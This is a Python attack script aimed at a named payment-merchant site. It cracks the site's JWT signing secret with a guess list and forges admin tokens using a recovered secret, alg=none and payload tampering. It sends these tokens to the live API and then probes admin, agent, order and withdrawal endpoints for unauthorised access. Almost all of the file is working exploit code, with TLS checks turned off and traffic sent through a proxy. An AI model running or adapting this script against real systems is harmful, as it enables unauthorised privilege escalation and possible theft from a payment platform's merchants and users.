import sys, json, io, base64, hashlib, hmac, urllib.request, ssl, http.cookiejar
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

HOST = "merchant.lamuzhifu.top"
BASE = "https://" + HOST
PROXY = "http://127.0.0.1:10809"
TOKEN = json.load(open(r"E:\IOSusdt\token.json"))["token"]

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
op = urllib.request.build_opener(
    urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}),
    urllib.request.HTTPSHandler(context=ctx))


def call(path, method="GET", body=None, hd=None, tok=None):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0 Safari/537.36",
         "Accept": "application/json, text/plain, */*",
         "Origin": BASE, "Referer": BASE + "/dashboard"}
    if tok: h["Authorization"] = tok
    if hd: h.update(hd)
    data = json.dumps(body).encode() if body is not None else None
    if data: h["Content-Type"] = "application/json"
    try:
        r = op.open(urllib.request.Request(BASE + path, data=data, headers=h,
                                          method=method), timeout=25)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}"


print("=" * 78)
print("A) JWT forgery probes — what does the server trust?")
print("=" * 78)


def mk(header, payload, secret, alg="HS256"):
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
    h, p = b64(header), b64(payload)
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    return f"{h}.{p}.{sig}"


ORIG = json.load(open(r"E:\IOSusdt\token.json"))["token"].replace("Bearer ", "")
oh, op_, os_ = ORIG.split(".")
PAY = json.loads(base64.urlsafe_b64decode(op_ + "=" * (-len(op_) % 4)))

WEAK = ["secret", "123456", "jwt", "azhifu", "lamuzhifu", "key", "admin", "password",
        "jwtsecret", "azhifu2024", "lamuzhifu2024", "azhifu-secret", "token", "1234567890",
        "merchant", "pay", "zhifu", "lamu", "champion", "guanjun"]

# 1) weak-secret brute force against the REAL signature
found = None
for s in WEAK:
    for cand in [s, s.upper(), s + "123", s + "!", s + "2024", s + "2025"]:
        h, p = oh, op_
        sig = base64.urlsafe_b64encode(
            hmac.new(cand.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
        if sig == os_:
            found = cand
            break
    if found:
        break
print(f"[*] weak HS256 secret:", found if found else "not in wordlist")

# 2) does the server accept a forged type=admin token signed with a weak secret?
if found:
    forged = mk({"alg": "HS256", "typ": "JWT"},
                {**PAY, "type": "admin"}, found)
    st, b = call("/api/Account/Self", tok="Bearer " + forged)
    print(f"[*] forged admin token -> {st} {b[:200]}")
else:
    print("[*] no secret recovered; testing alg=none and unsigned variants")

# 3) alg=none
def b64r(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
none_tok = f"{b64r({'alg':'none','typ':'JWT'})}.{b64r({**PAY,'type':'admin'})}."
st, b = call("/api/Account/Self", tok="Bearer " + none_tok)
print(f"[*] alg=none          -> {st} {b[:200]}")

# 4) tamper payload, keep original signature
tampered = f"{oh}.{b64r({**PAY,'type':'admin'})}.{os_}"
st, b = call("/api/Account/Self", tok="Bearer " + tampered)
print(f"[*] tampered+keepsig  -> {st} {b[:200]}")

print()
print("=" * 78)
print("B) Admin / agent endpoint discovery (with current merchant token)")
print("=" * 78)
CAND = [
    "/api/Admin/List", "/api/Admin/Info", "/api/Agent/List", "/api/Agent/Info",
    "/api/Agent/Subordinates", "/api/Agent/Commission", "/api/Agent/RechargeRecord",
    "/api/System/AdminList", "/api/System/AgentList", "/api/Merchant/List",
    "/api/Merchant/All", "/api/Order/All", "/api/Statistics/All",
    "/api/Transaction/AllList", "/api/BalanceRecord/AllList",
    "/api/CommissionSettlement/AllList", "/api/Withdrawal/Apply",
    "/api/WebOrder/ApplyWithdrawalOrders", "/api/Permission/List",
    "/api/Role/List", "/api/User/List", "/api/Account/List",
]
for p in CAND:
    st, b = call(p, "GET", tok=TOKEN)
    tag = b[:110].replace("\n", " ")
    print(f"  GET  {st:>4} {p:44s} {tag}")
